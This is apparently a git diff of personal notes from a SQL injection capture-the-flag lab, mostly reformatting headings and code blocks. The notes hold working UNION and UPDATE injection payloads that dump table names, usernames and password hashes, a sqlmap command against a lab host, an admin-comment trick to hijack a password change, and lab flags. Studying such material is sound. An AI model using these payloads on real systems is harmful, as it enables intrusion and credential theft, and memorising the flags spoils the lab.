@@ -1,3 +1,10 @@
+- search bar
+- update statement
+-  change password
+-  book title "union"
+-  
+
+
 ### search bar
 
 search for true item
@@ -6,6 +13,7 @@ search for wildcards
 
 construct query
 
+```sql
 select ? from ? where ? like '%hammer%';
 
 get db type
@@ -22,22 +30,22 @@ select ?,?,? from ? where ? like '%hammer' union (select column_name,2,3 from in
 
 select ?,?,? from ? where ? like '%hammer' union (select uLogin, uHash, uType from users);--
 
+```
 
 
-
-Update statement
-
-
-UPDATE <table_name> SET nickName='name', email='email' WHERE <condition>
+### Update statement
 
 ```sql
+UPDATE <table_name> SET nickName='name', email='email' WHERE <condition>
+```
+
 # MySQL and MSSQL
 ',nickName=@@version,email='
 # For Oracle
 ',nickName=(SELECT banner FROM v$version),email='
 # For SQLite
 ',nickName=sqlite_version(),email='
-```
+
 
 ```sql
 ',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='
@@ -85,7 +93,7 @@ sqlmap --tamper tamper/so-tamper.py --url http://10.10.1.134:5000/challenge4/sig
 THM{4644c7e157fd5498e7e4026c89650814}
 
 
-Change Password
+### Change Password
 
 create new user admin' -- -:a
 
@@ -102,6 +110,7 @@ THM{cd5c4f197d708fda06979f13d8081013}
 
 
 SELECT * from books WHERE id = (SELECT id FROM books WHERE title like 'harr%')
+```sql
 
 ') union select 1,2,3,4 from sqlite_master-- -
 
@@ -189,7 +198,7 @@ Title: student
 password
 
 Author: 4
-
+```
 
 
 
@@ -227,7 +236,7 @@ SELECT * FROM books WHERE id = 'CREATE TABLE books (
 
 ' union select '-1''union select 1,tbl_name,3,4 from sqlite_master-- -
 
-
+```
 Title: books
 
 3
@@ -243,7 +252,7 @@ Title: users
 3
 
 Author: 4
-
+```
 
 
 ' union select '-1''
